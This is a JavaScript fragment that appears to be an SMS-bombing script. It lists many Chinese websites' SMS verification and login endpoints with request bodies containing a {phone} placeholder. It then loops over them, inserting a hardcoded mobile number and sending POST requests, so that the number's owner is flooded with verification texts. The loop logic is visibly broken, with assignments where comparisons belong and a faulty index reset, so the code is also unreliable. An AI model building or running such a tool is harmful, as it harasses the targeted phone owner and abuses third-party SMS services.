  "c=quick&d=getsms&nationcode=86&phone={phone}&type=2&v=1626775646428",
  "POST",
  "https://mall-cashback.tinman.cn/noRight/campaign/send-verification-code",
  "phone={phone}",
  "POST",
  "https://www.51hengsheng.com/proxy/verify!sendVerify.do",
  "dto.phone={phone}&dto.tempNumber=SMS_107505040",
  "POST",
  "https://zg99.offcn.com/index/chaxun/sendmsg",
  "actid=40386&callback=jQuery111306786107026988504_1627575799465&phone={phone}&_=1627575799466",
  "POST",
  "https://z12.cnzz.com/stat.htm",
  "id=1280063424&r=&lg=zh-cn&ntime=1632490428&cnzz_eid=1185173797-1632490428-&showp=424x906&p=",
  "POST",
  "https://api.nysytijian.com/api/common/GetVerifyCode",
  "phoneNumber={phone}",
  "POST",
  "https://editor.588ku.com/site-api/send-tel-login-code",
  "num={phone}&csrfToken=u1yzmFkHty7RXv0zSXJ7sLNTAs4ax6KfYciaU6GZKYXpkJHGQJXcM0IuJ-GrjMhUl9mcRx6Jnp6dWESUThFYog==",
  "POST",
  "https://ihealth.zhongan.com/api/whale/v1/H5/gift/message/sendSmsCode/1000000003",
  "phone={phone}&productCode=AT34&envSource=browser",
  "POST",
  "https://m.95303.com/api/OrderYx/GetCodeBySMS",
  "mobile={phone}&_=1626625066773",
  "POST",
  "https://www.51hawo.com/apollo/MobileCode/sendMobileCode",
  "mobile={phone}&sms_type=101&register_from=20000091",
  "POST",
  "https://m.ctscd.com/sys/ajax/User/CheckOrActivat.ashx",
  "U_Mobile={phone}&type=Mobile&checktext={phone}&_=1624877392029",
  "POST",
  "https://gwbk.zhongan.com/dmapiv2/za-dm-insure/dm/user/sendSMGCode",
  "mobilePhone={phone}",
  "POST",
  "https://m.lu.com/user/service/login/otp-login-pre-check",
  "mobileNo={phone}&skipPwd=1",
  "POST",
  "https://igetcool-share.igetcool.com/mall-server/api/smscode/sendSmscode",
  "phone={phone}&countrycode=86&smstype=0&type=0",
  "POST",
  "https://pro.ouyeel.com/api/users/userApi/sendMsg",
  "mobile={phone}",
  "POST",
  "https://www.sensorsdata.cn/api/passport/sms/quest_new/{phone}?_t=qajgslud4i",
  "POST",
  "https://z12.cnzz.com/stat.htm",
  "id=12800",
];

var name = "15237270715";

for (var i = 0; i < jiekou.length; i++) {
  if ((jiekou[i] = "GET")) {
    i = 1 + 1;
    jiekoua = jiekou[i].replace(/{phone}/, name);
    document.getElementById("d1").innerHTML = "<img src='" + jiekoua + "'>";
  } else if ((jiekou[i] = "POST")) {
    i = 1 + 1;
    var jkb = jiekou[i];
    i = i + 1;
    jkc = jiekou[i].replace(/{phone}/, name);
    var httpRequest = new XMLHttpRequest(); //第一步：创建需要的对象
    httpRequest.open("POST", jkb, true); //第二步：打开连接
    httpRequest.setRequestHeader(
      "Content-type",
      "application/x-www-form-urlencoded"
    ); //设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）
    httpRequest.send(jkc);
  }
}